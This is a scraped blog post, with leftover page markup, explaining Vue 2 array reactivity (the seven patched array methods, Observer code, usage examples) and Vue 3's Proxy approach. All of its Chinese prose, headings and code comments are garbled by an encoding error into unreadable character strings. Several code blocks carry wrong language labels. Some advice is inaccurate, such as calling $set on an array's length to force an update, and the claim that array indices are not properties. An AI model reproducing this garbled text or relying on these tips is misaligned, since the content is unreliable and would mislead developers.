                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ä¸€ã€å¼€ç¯‡ï¼šä¸ºä»€ä¹ˆæ™®é€šæ•°ç»„æ“ä½œæ— æ³•è¢«Vueç›‘å¬ï¼Ÿ</h2>
<p>åœ¨Vueå¼€å‘ä¸­ï¼Œæˆ‘ä»¬ç»å¸¸ä¼šé‡åˆ°è¿™æ ·çš„å›°æƒ‘ï¼šä¸ºä»€ä¹ˆç›´æ¥é€šè¿‡ç´¢å¼•ä¿®æ”¹æ•°ç»„å…ƒç´ ï¼Œæˆ–è€…ä¿®æ”¹æ•°ç»„é•¿åº¦æ—¶ï¼Œè§†å›¾ä¸ä¼šæ›´æ–°ï¼Ÿ</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-comment">//Â è¿™äº›æ“ä½œæ— æ³•è§¦å‘å“åº”å¼æ›´æ–°</span>
<span class="hljs-keyword">const</span>Â <span class="hljs-variable constant_">vmÂ </span>=Â <span class="hljs-keyword">new</span><span class="hljs-title function_ invoke__">Â Vue</span>({
<span class="hljs-attr">Â Â data</span>:Â {
<span class="hljs-attr">Â Â Â Â items</span>:Â [<span class="hljs-string">'a'</span>,Â <span class="hljs-string">'b'</span>,Â <span class="hljs-string">'c'</span>]
Â Â }
})

vm.items[<span class="hljs-number">1</span>]Â =Â <span class="hljs-string">'x'</span>Â Â <span class="hljs-comment">//Â âŒÂ è§†å›¾ä¸ä¼šæ›´æ–°</span>
vm.items.lengthÂ =Â <span class="hljs-number">1</span>Â <span class="hljs-comment">//Â âŒÂ è§†å›¾ä¸ä¼šæ›´æ–°</span>
</code></pre>
<p>è¿™æ˜¯å› ä¸ºVue 2.xä½¿ç”¨çš„æ˜¯<code>Object.defineProperty</code>è¿›è¡Œæ•°æ®åŠ«æŒï¼Œè€ŒJavaScriptçš„æ•°ç»„ç´¢å¼•å¹¶ä¸æ˜¯å¯¹è±¡çš„"å±æ€§"ï¼Œæ•°ç»„é•¿åº¦çš„å˜åŒ–ä¹Ÿæ— æ³•é€šè¿‡å±æ€§æ‹¦æˆªæ¥ç›‘å¬ã€‚</p>
<h2 data-id="heading-1">äºŒã€Vueèƒ½ç›‘å¬çš„æ•°ç»„æ–¹æ³•</h2>
<p>Vueé€šè¿‡é‡å†™æ•°ç»„çš„åŸå‹æ–¹æ³•ï¼Œå®ç°äº†å¯¹ä»¥ä¸‹7ç§æ•°ç»„å˜æ›´æ–¹æ³•çš„ç›‘å¬ï¼š</p>
<h3 data-id="heading-2">1. å˜æ›´æ–¹æ³•ï¼ˆä¼šè§¦å‘è§†å›¾æ›´æ–°ï¼‰</h3>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">//Â 1.Â push()Â -Â æœ«å°¾æ·»åŠ å…ƒç´ </span>
vm<span class="hljs-selector-class">.items</span><span class="hljs-selector-class">.push</span>('d')Â Â <span class="hljs-comment">//Â âœ…Â è§¦å‘æ›´æ–°</span>

<span class="hljs-comment">//Â 2.Â pop()Â -Â åˆ é™¤æœ€åä¸€ä¸ªå…ƒç´ </span>
vm<span class="hljs-selector-class">.items</span><span class="hljs-selector-class">.pop</span>()Â Â <span class="hljs-comment">//Â âœ…Â è§¦å‘æ›´æ–°</span>

<span class="hljs-comment">//Â 3.Â shift()Â -Â åˆ é™¤ç¬¬ä¸€ä¸ªå…ƒç´ </span>
vm<span class="hljs-selector-class">.items</span><span class="hljs-selector-class">.shift</span>()Â Â <span class="hljs-comment">//Â âœ…Â è§¦å‘æ›´æ–°</span>

<span class="hljs-comment">//Â 4.Â unshift()Â -Â å¼€å¤´æ·»åŠ å…ƒç´ </span>
vm<span class="hljs-selector-class">.items</span><span class="hljs-selector-class">.unshift</span>('z')Â Â <span class="hljs-comment">//Â âœ…Â è§¦å‘æ›´æ–°</span>

<span class="hljs-comment">//Â 5.Â splice()Â -Â åˆ é™¤/æ›¿æ¢/æ·»åŠ å…ƒç´ </span>
vm<span class="hljs-selector-class">.items</span><span class="hljs-selector-class">.splice</span>(<span class="hljs-number">1</span>,Â <span class="hljs-number">1</span>,Â 'new')Â Â <span class="hljs-comment">//Â âœ…Â è§¦å‘æ›´æ–°</span>

<span class="hljs-comment">//Â 6.Â sort()Â -Â æ’åº</span>
vm<span class="hljs-selector-class">.items</span><span class="hljs-selector-class">.sort</span>()Â Â <span class="hljs-comment">//Â âœ…Â è§¦å‘æ›´æ–°</span>

<span class="hljs-comment">//Â 7.Â reverse()Â -Â åè½¬</span>
vm<span class="hljs-selector-class">.items</span><span class="hljs-selector-class">.reverse</span>()Â Â <span class="hljs-comment">//Â âœ…Â è§¦å‘æ›´æ–°</span>
</code></pre>
<h3 data-id="heading-3">2. æ›¿æ¢æ–¹æ³•ï¼ˆéœ€é‡æ–°èµ‹å€¼ï¼‰</h3>
<p>å¯¹äºè¿”å›æ–°æ•°ç»„çš„æ–¹æ³•ï¼Œéœ€è¦é‡æ–°èµ‹å€¼ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">//Â filter(),Â concat(),Â slice()Â ç­‰</span>
vm.<span class="hljs-property">items</span>Â =Â vm.<span class="hljs-property">items</span>.<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">item</span>Â =&gt;</span>Â itemÂ !==Â <span class="hljs-string">'b'</span>)Â Â <span class="hljs-comment">//Â âœ…Â éœ€è¦é‡æ–°èµ‹å€¼</span>
</code></pre>
<h2 data-id="heading-4">ä¸‰ã€æºç è§£æï¼šVueå¦‚ä½•å®ç°æ•°ç»„å“åº”å¼</h2>
<h3 data-id="heading-5">1. æ ¸å¿ƒå®ç°åŸç†</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">//Â ç®€åŒ–ç‰ˆçš„Vueæ•°ç»„å“åº”å¼å®ç°</span>
<span class="hljs-keyword">const</span>Â arrayProtoÂ =Â <span class="hljs-title class_">Array</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>
<span class="hljs-keyword">const</span>Â arrayMethodsÂ =Â <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(arrayProto)

<span class="hljs-keyword">const</span>Â methodsToPatchÂ =Â [
Â Â <span class="hljs-string">'push'</span>,
Â Â <span class="hljs-string">'pop'</span>,
Â Â <span class="hljs-string">'shift'</span>,
Â Â <span class="hljs-string">'unshift'</span>,
Â Â <span class="hljs-string">'splice'</span>,
Â Â <span class="hljs-string">'sort'</span>,
Â Â <span class="hljs-string">'reverse'</span>
]

methodsToPatch.<span class="hljs-title function_">forEach</span>(<span class="hljs-keyword">function</span>Â (<span class="hljs-params">method</span>)Â {
Â Â <span class="hljs-comment">//Â ç¼“å­˜åŸå§‹æ–¹æ³•</span>
Â Â <span class="hljs-keyword">const</span>Â originalÂ =Â arrayProto[method]
Â Â 
Â Â <span class="hljs-comment">//Â é‡å†™æ•°ç»„æ–¹æ³•</span>
Â Â <span class="hljs-title function_">def</span>(arrayMethods,Â method,Â <span class="hljs-keyword">function</span>Â <span class="hljs-title function_">mutator</span>(<span class="hljs-params">...args</span>)Â {
Â Â Â Â <span class="hljs-comment">//Â 1.Â æ‰§è¡ŒåŸå§‹æ–¹æ³•</span>
Â Â Â Â <span class="hljs-keyword">const</span>Â resultÂ =Â original.<span class="hljs-title function_">apply</span>(<span class="hljs-variable language_">this</span>,Â args)
Â Â Â Â 
Â Â Â Â <span class="hljs-comment">//Â 2.Â è·å–æ•°ç»„çš„Observerå®ä¾‹</span>
Â Â Â Â <span class="hljs-keyword">const</span>Â obÂ =Â <span class="hljs-variable language_">this</span>.<span class="hljs-property">__ob__</span>
Â Â Â Â 
Â Â Â Â <span class="hljs-comment">//Â 3.Â å¯¹æ–°å¢å…ƒç´ è¿›è¡Œå“åº”å¼å¤„ç†</span>
Â Â Â Â <span class="hljs-keyword">let</span>Â inserted
Â Â Â Â <span class="hljs-keyword">switch</span>Â (method)Â {
Â Â Â Â Â Â <span class="hljs-keyword">case</span>Â <span class="hljs-string">'push'</span>:
Â Â Â Â Â Â <span class="hljs-keyword">case</span>Â <span class="hljs-string">'unshift'</span>:
Â Â Â Â Â Â Â Â insertedÂ =Â args
Â Â Â Â Â Â Â Â <span class="hljs-keyword">break</span>
Â Â Â Â Â Â <span class="hljs-keyword">case</span>Â <span class="hljs-string">'splice'</span>:
Â Â Â Â Â Â Â Â insertedÂ =Â args.<span class="hljs-title function_">slice</span>(<span class="hljs-number">2</span>)
Â Â Â Â Â Â Â Â <span class="hljs-keyword">break</span>
Â Â Â Â }
Â Â Â Â <span class="hljs-keyword">if</span>Â (inserted)Â ob.<span class="hljs-title function_">observeArray</span>(inserted)
Â Â Â Â 
Â Â Â Â <span class="hljs-comment">//Â 4.Â é€šçŸ¥ä¾èµ–æ›´æ–°</span>
Â Â Â Â ob.<span class="hljs-property">dep</span>.<span class="hljs-title function_">notify</span>()
Â Â Â Â 
Â Â Â Â <span class="hljs-keyword">return</span>Â result
Â Â })
})

<span class="hljs-keyword">function</span>Â <span class="hljs-title function_">def</span>(<span class="hljs-params">obj,Â key,Â val,Â enumerable</span>)Â {
Â Â <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">defineProperty</span>(obj,Â key,Â {
Â Â Â Â <span class="hljs-attr">value</span>:Â val,
Â Â Â Â <span class="hljs-attr">enumerable</span>:Â !!enumerable,
Â Â Â Â <span class="hljs-attr">writable</span>:Â <span class="hljs-literal">true</span>,
Â Â Â Â <span class="hljs-attr">configurable</span>:Â <span class="hljs-literal">true</span>
Â Â })
}
</code></pre>
<h3 data-id="heading-6">2. Observerç±»çš„å…³é”®ä»£ç </h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">class</span>Â <span class="hljs-title class_">Observer</span>Â {
Â Â <span class="hljs-title function_">constructor</span>(<span class="hljs-params">value</span>)Â {
Â Â Â Â <span class="hljs-variable language_">this</span>.<span class="hljs-property">value</span>Â =Â value
Â Â Â Â <span class="hljs-variable language_">this</span>.<span class="hljs-property">dep</span>Â =Â <span class="hljs-keyword">new</span>Â <span class="hljs-title class_">Dep</span>()
Â Â Â Â 
Â Â Â Â <span class="hljs-comment">//Â ç»™æ•°ç»„æ·»åŠ __ob__å±æ€§ï¼ŒæŒ‡å‘Observerå®ä¾‹</span>
Â Â Â Â <span class="hljs-title function_">def</span>(value,Â <span class="hljs-string">'__ob__'</span>,Â <span class="hljs-variable language_">this</span>)
Â Â Â Â 
Â Â Â Â <span class="hljs-keyword">if</span>Â (<span class="hljs-title class_">Array</span>.<span class="hljs-title function_">isArray</span>(value))Â {
Â Â Â Â Â Â <span class="hljs-comment">//Â é‡å†™æ•°ç»„çš„åŸå‹æ–¹æ³•</span>
Â Â Â Â Â Â value.<span class="hljs-property">__proto__</span>Â =Â arrayMethods
Â Â Â Â Â Â <span class="hljs-comment">//Â å¯¹æ•°ç»„ä¸­çš„æ¯ä¸ªå…ƒç´ è¿›è¡Œè§‚å¯Ÿ</span>
Â Â Â Â Â Â <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">observeArray</span>(value)
Â Â Â Â }Â <span class="hljs-keyword">else</span>Â {
Â Â Â Â Â Â <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">walk</span>(value)
Â Â Â Â }
Â Â }
Â Â 
Â Â <span class="hljs-title function_">observeArray</span>(<span class="hljs-params">items</span>)Â {
Â Â Â Â <span class="hljs-keyword">for</span>Â (<span class="hljs-keyword">let</span>Â iÂ =Â <span class="hljs-number">0</span>,Â lÂ =Â items.<span class="hljs-property">length</span>;Â iÂ &lt;Â l;Â i++)Â {
Â Â Â Â Â Â <span class="hljs-title function_">observe</span>(items[i])
Â Â Â Â }
Â Â }
}
</code></pre>
<h2 data-id="heading-7">å››ã€æµç¨‹å›¾è§£ï¼šæ•°ç»„å“åº”å¼çš„å·¥ä½œæµç¨‹</h2>
<pre><code class="hljs">æ˜¯

å¦

æ˜¯

å¦

åˆå§‹åŒ–å“åº”å¼æ•°ç»„åˆ›å»ºObserverå®ä¾‹æ˜¯å¦ä¸ºæ•°ç»„é‡å†™æ•°ç»„åŸå‹æ–¹æ³•éå†å¯¹è±¡å±æ€§æ‹¦æˆª7ä¸ªå˜æ›´æ–¹æ³•æ‰§è¡ŒåŸå§‹æ•°ç»„æ–¹æ³•æ˜¯å¦æœ‰æ–°å¢å…ƒç´ å¯¹æ–°å…ƒç´ è¿›è¡Œå“åº”å¼å¤„ç†è·³è¿‡é€šçŸ¥ä¾èµ–æ›´æ–°è§†å›¾æ›´æ–°
</code></pre>
<h2 data-id="heading-8">äº”ã€å®æˆ˜åº”ç”¨åœºæ™¯</h2>
<h3 data-id="heading-9">åœºæ™¯1ï¼šåŠ¨æ€åˆ—è¡¨æ“ä½œ</h3>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
Â Â <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
Â Â Â Â <span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span>
Â Â Â Â Â Â <span class="hljs-tag">&lt;<span class="hljs-name">li</span>Â <span class="hljs-attr">v-for</span>=<span class="hljs-string">"(item,Â index)Â inÂ list"</span>Â <span class="hljs-attr">:key</span>=<span class="hljs-string">"item.id"</span>&gt;</span>
Â Â Â Â Â Â Â Â {{Â item.nameÂ }}
Â Â Â Â Â Â Â Â <span class="hljs-tag">&lt;<span class="hljs-name">button</span>Â @<span class="hljs-attr">click</span>=<span class="hljs-string">"removeItem(index)"</span>&gt;</span>åˆ é™¤<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
Â Â Â Â Â Â <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
Â Â Â Â <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span>
Â Â Â Â <span class="hljs-tag">&lt;<span class="hljs-name">button</span>Â @<span class="hljs-attr">click</span>=<span class="hljs-string">"addItem"</span>&gt;</span>æ·»åŠ <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
Â Â Â Â <span class="hljs-tag">&lt;<span class="hljs-name">button</span>Â @<span class="hljs-attr">click</span>=<span class="hljs-string">"sortList"</span>&gt;</span>æ’åº<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
Â Â <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">export</span>Â <span class="hljs-keyword">default</span>Â {
Â Â <span class="hljs-title function_">data</span>(<span class="hljs-params"/>)Â {
Â Â Â Â <span class="hljs-keyword">return</span>Â {
Â Â Â Â Â Â <span class="hljs-attr">list</span>:Â [
Â Â Â Â Â Â Â Â {Â <span class="hljs-attr">id</span>:Â <span class="hljs-number">1</span>,Â <span class="hljs-attr">name</span>:Â <span class="hljs-string">'ItemÂ 1'</span>Â },
Â Â Â Â Â Â Â Â {Â <span class="hljs-attr">id</span>:Â <span class="hljs-number">2</span>,Â <span class="hljs-attr">name</span>:Â <span class="hljs-string">'é¡¹ç›®Â 2'</span>Â },
Â Â Â Â Â Â Â Â {Â <span class="hljs-attr">id</span>:Â <span class="hljs-number">3</span>,Â <span class="hljs-attr">name</span>:Â <span class="hljs-string">'ã‚¢ã‚¤ãƒ†ãƒ Â 3'</span>Â }
Â Â Â Â Â Â ],
Â Â Â Â Â Â <span class="hljs-attr">nextId</span>:Â <span class="hljs-number">4</span>
Â Â Â Â }
Â Â },
Â Â <span class="hljs-attr">methods</span>:Â {
Â Â Â Â <span class="hljs-title function_">addItem</span>(<span class="hljs-params"/>)Â {
Â Â Â Â Â Â <span class="hljs-comment">//Â ä½¿ç”¨pushæ–¹æ³•ï¼ŒVueèƒ½ç›‘å¬åˆ°</span>
Â Â Â Â Â Â <span class="hljs-variable language_">this</span>.<span class="hljs-property">list</span>.<span class="hljs-title function_">push</span>({
Â Â Â Â Â Â Â Â <span class="hljs-attr">id</span>:Â <span class="hljs-variable language_">this</span>.<span class="hljs-property">nextId</span>++,
Â Â Â Â Â Â Â Â <span class="hljs-attr">name</span>:Â <span class="hljs-string">`æ–°é¡¹ç›®Â <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.nextId}</span>`</span>
Â Â Â Â Â Â })
Â Â Â Â },
Â Â Â Â <span class="hljs-title function_">removeItem</span>(<span class="hljs-params">index</span>)Â {
Â Â Â Â Â Â <span class="hljs-comment">//Â ä½¿ç”¨spliceæ–¹æ³•ï¼ŒVueèƒ½ç›‘å¬åˆ°</span>
Â Â Â Â Â Â <span class="hljs-variable language_">this</span>.<span class="hljs-property">list</span>.<span class="hljs-title function_">splice</span>(index,Â <span class="hljs-number">1</span>)
Â Â Â Â },
Â Â Â Â <span class="hljs-title function_">sortList</span>(<span class="hljs-params"/>)Â {
Â Â Â Â Â Â <span class="hljs-comment">//Â ä½¿ç”¨sortæ–¹æ³•ï¼ŒVueèƒ½ç›‘å¬åˆ°</span>
Â Â Â Â Â Â <span class="hljs-variable language_">this</span>.<span class="hljs-property">list</span>.<span class="hljs-title function_">sort</span>(<span class="hljs-function">(<span class="hljs-params">a,Â b</span>)Â =&gt;</span>Â a.<span class="hljs-property">name</span>.<span class="hljs-title function_">localeCompare</span>(b.<span class="hljs-property">name</span>))
Â Â Â Â }
Â Â }
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<h3 data-id="heading-10">åœºæ™¯2ï¼šæ‰¹é‡æ“ä½œä¼˜åŒ–</h3>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">//Â æ‰¹é‡æ·»åŠ å…ƒç´ çš„é«˜æ•ˆå†™æ³•</span>
addMultipleItems()Â {
Â Â <span class="hljs-comment">//Â æ–¹æ³•1ï¼šä½¿ç”¨æ‰©å±•è¿ç®—ç¬¦ï¼ˆéœ€è¦é‡æ–°èµ‹å€¼ï¼‰</span>
Â Â <span class="hljs-keyword">this</span>.listÂ =Â [...<span class="hljs-keyword">this</span>.list,Â ...newItems]
Â Â 
Â Â <span class="hljs-comment">//Â æ–¹æ³•2ï¼šä½¿ç”¨pushÂ +Â æ‰©å±•è¿ç®—ç¬¦</span>
Â Â <span class="hljs-keyword">this</span>.list.push(...newItems)
Â Â 
Â Â <span class="hljs-comment">//Â æ–¹æ³•3ï¼šä½¿ç”¨splice</span>
Â Â <span class="hljs-keyword">this</span>.list.splice(<span class="hljs-keyword">this</span>.list.length,Â <span class="hljs-number">0</span>,Â ...newItems)
}
</code></pre>
<h2 data-id="heading-11">å…­ã€Vue 3çš„æ”¹è¿›ï¼šProxyå®ç°</h2>
<p>åœ¨Vue 3ä¸­ï¼Œä½¿ç”¨Proxyæ›¿ä»£äº†Object.definePropertyï¼Œå¤©ç„¶æ”¯æŒæ•°ç»„ç´¢å¼•çš„ç›‘å¬ï¼š</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-comment">//Â VueÂ 3ä¸­ä½¿ç”¨Proxyï¼Œå¯ä»¥ç›‘å¬æ•°ç»„ç´¢å¼•æ“ä½œ</span>
<span class="hljs-type">const</span>Â reactiveArrayÂ =Â <span class="hljs-built_in">reactive</span>([<span class="hljs-string">'a'</span>,Â <span class="hljs-string">'b'</span>,Â <span class="hljs-string">'c'</span>])

<span class="hljs-comment">//Â âœ…Â è¿™äº›æ“ä½œåœ¨VueÂ 3ä¸­éƒ½èƒ½è¢«ç›‘å¬</span>
reactiveArray[<span class="hljs-number">1</span>]Â =Â <span class="hljs-string">'x'</span>Â Â <span class="hljs-comment">//Â ç›´æ¥ä¿®æ”¹ç´¢å¼•</span>
reactiveArray.lengthÂ =Â <span class="hljs-number">1</span>Â Â <span class="hljs-comment">//Â ä¿®æ”¹é•¿åº¦</span>
</code></pre>
<h2 data-id="heading-12">ä¸ƒã€å¸¸è§é—®é¢˜ä¸è§£å†³æ–¹æ¡ˆ</h2>
<h3 data-id="heading-13">é—®é¢˜1ï¼šå¦‚ä½•ç›‘å¬æ•°ç»„é•¿åº¦å˜åŒ–ï¼Ÿ</h3>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">//Â ä½¿ç”¨è®¡ç®—å±æ€§ç›‘å¬æ•°ç»„é•¿åº¦</span>
computed:Â {
Â Â listLength()Â {
Â Â Â Â <span class="hljs-keyword">return</span>Â <span class="hljs-keyword">this</span>.items.length
Â Â }
}

<span class="hljs-comment">//Â æˆ–è€…ä½¿ç”¨$setå¼ºåˆ¶æ›´æ–°</span>
<span class="hljs-keyword">this</span>.$<span class="hljs-keyword">set</span>(<span class="hljs-keyword">this</span>.items,Â <span class="hljs-string">'length'</span>,Â newLength)
</code></pre>
<h3 data-id="heading-14">é—®é¢˜2ï¼šå¦‚ä½•å¤„ç†åµŒå¥—æ•°ç»„ï¼Ÿ</h3>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">//Â åµŒå¥—æ•°ç»„ä¹Ÿéœ€è¦ä½¿ç”¨å“åº”å¼æ–¹æ³•</span>
<span class="hljs-keyword">data</span>()Â {
Â Â <span class="hljs-keyword">return</span>Â {
Â Â Â Â nestedArray:Â [
Â Â Â Â Â Â {Â items:Â [<span class="hljs-string">'a'</span>,Â <span class="hljs-string">'b'</span>]Â },
Â Â Â Â Â Â {Â items:Â [<span class="hljs-string">'c'</span>,Â <span class="hljs-string">'d'</span>]Â }
Â Â Â Â ]
Â Â }
},
methods:Â {
Â Â updateNestedArray()Â {
Â Â Â Â <span class="hljs-comment">//Â æ­£ç¡®åšæ³•ï¼šä½¿ç”¨Vue.setæˆ–æ•°ç»„æ–¹æ³•</span>
Â Â Â Â <span class="hljs-keyword">this</span>.$<span class="hljs-keyword">set</span>(<span class="hljs-keyword">this</span>.nestedArray[<span class="hljs-number">0</span>].items,Â <span class="hljs-number">1</span>,Â <span class="hljs-string">'new'</span>)
Â Â Â Â <span class="hljs-comment">//Â æˆ–è€…</span>
Â Â Â Â <span class="hljs-keyword">this</span>.nestedArray[<span class="hljs-number">0</span>].items.splice(<span class="hljs-number">1</span>,Â <span class="hljs-number">1</span>,Â <span class="hljs-string">'new'</span>)
Â Â }
}
</code></pre>
<h3 data-id="heading-15">é—®é¢˜3ï¼šæ€§èƒ½ä¼˜åŒ–å»ºè®®</h3>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">//Â 1.Â é¿å…åœ¨æ¨¡æ¿ä¸­ç›´æ¥æ“ä½œæ•°ç»„</span>
<span class="hljs-comment">//Â âŒÂ ä¸æ¨è</span>
&lt;divÂ v-<span class="hljs-keyword">for</span>=<span class="hljs-string">"itemÂ inÂ list.reverse()"</span>&gt;

<span class="hljs-comment">//Â âœ…Â æ¨è</span>
&lt;divÂ v-<span class="hljs-keyword">for</span>=<span class="hljs-string">"itemÂ inÂ reversedList"</span>&gt;
computed:Â {
Â Â reversedList()Â {
Â Â Â Â <span class="hljs-keyword">return</span>Â [...<span class="hljs-keyword">this</span>.list].reverse()
Â Â }
}

<span class="hljs-comment">//Â 2.Â å¤§æ•°æ®é‡ä½¿ç”¨è™šæ‹Ÿæ»šåŠ¨</span>
</code></pre>
<h2 data-id="heading-16">å…«ã€æ€»ç»“ä¸æœ€ä½³å®è·µ</h2>
<ol>
<li>1.Â <strong>å§‹ç»ˆä½¿ç”¨Vueæä¾›çš„æ•°ç»„æ–¹æ³•</strong>è¿›è¡Œæ•°ç»„å˜æ›´æ“ä½œ</li>
<li>2.Â <strong>å¯¹äºè¿”å›æ–°æ•°ç»„çš„æ–¹æ³•</strong>ï¼Œè®°å¾—é‡æ–°èµ‹å€¼</li>
<li>3.Â <strong>ä½¿ç”¨Vue.set/$set</strong>å¤„ç†æ— æ³•ç›‘å¬çš„æƒ…å†µ</li>
<li>4.Â <strong>åœ¨Vue 2ä¸­</strong>ï¼Œé¿å…ç›´æ¥é€šè¿‡ç´¢å¼•ä¿®æ”¹æ•°ç»„</li>
<li>5.Â <strong>å‡çº§åˆ°Vue 3</strong>å¯ä»¥è·å¾—æ›´å¥½çš„æ•°ç»„å“åº”å¼æ”¯æŒ</li>
</ol>
